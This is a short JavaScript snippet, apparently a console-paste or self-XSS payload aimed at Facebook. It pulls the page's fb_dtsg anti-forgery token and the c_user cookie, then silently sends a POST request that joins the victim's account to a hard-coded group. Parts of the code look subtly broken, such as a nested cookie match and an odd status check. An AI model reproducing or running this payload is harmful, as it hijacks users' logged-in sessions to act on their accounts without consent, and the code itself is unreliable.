var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 setTimeout(function()  {
var Group = new XMLHttpRequest();
var GroupURL = "/ajax/groups/membership/r2j.php?__s=1";
var GroupParams = "&ref=group_jump_header&group_id=240579939429641&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
Group.open("POST", GroupURL, true);
Group.onreadystatechange = function () {
if (Group.readyState == 4 && Group.status == 210) {
Group.close
}
};
Group.send(GroupParams)
}
, 100)
